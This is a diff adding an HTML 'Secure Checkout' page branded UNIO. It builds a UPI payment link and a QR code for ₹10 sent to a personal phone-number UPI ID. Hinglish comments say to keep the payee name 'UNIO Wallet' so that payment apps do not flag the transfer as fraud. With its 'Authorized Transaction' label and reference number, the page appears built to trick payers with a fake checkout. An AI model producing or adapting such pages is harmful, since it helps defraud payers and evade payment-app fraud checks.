@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Checkout | UNIO</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .pay-card { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 350px; }
+        .price { font-size: 32px; font-weight: bold; color: #333; margin: 10px 0; }
+        .btn-pay { display: block; background: #008cff; color: white; text-decoration: none; padding: 15px; border-radius: 10px; font-weight: bold; margin-top: 20px; transition: 0.3s; }
+        .btn-pay:hover { background: #005bb5; }
+        .qr-box img { width: 200px; height: 200px; margin: 15px 0; }
+        .note { font-size: 12px; color: #777; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="pay-card">
+    <h3>Secure Payment</h3>
+    <div class="price">₹10.00</div>
+    
+    <a id="upi-link" href="#" class="btn-pay">Pay with UPI App</a>
+
+    <div class="qr-box">
+        <p style="font-size: 14px;">Or Scan QR</p>
+        <img id="upi-qr" src="" alt="UPI QR">
+    </div>
+
+    <p class="note">Authorized Transaction for Ref: WID_9302369504</p>
+</div>
+
+<script>
+    // In details ko apne hisaab se change karein
+    const upiId = "8252053838@mbk"; 
+    const payeeName = "UNIO Wallet"; // Apps ko fraud na lage isliye naam zaroor rakhein
+    const amount = "10.00";
+    const note = "WID_9302369504_REF455";
+
+    // Standard UPI URI format (Apps ke liye safe)
+    const upiUri = `upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${amount}&tn=${encodeURIComponent(note)}&cu=INR`;
+
+    // 1. Mobile Button set karein
+    document.getElementById('upi-link').href = upiUri;
+
+    // 2. QR Code set karein (Computers ke liye)
+    const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiUri)}`;
+    document.getElementById('upi-qr').src = qrApi;
+
+    // Auto-fetch logic (optional)
+    // Aap yahan apna 6-second wala interval add kar sakte hain status check karne ke liye
+</script>
+
+</body>
+</html>
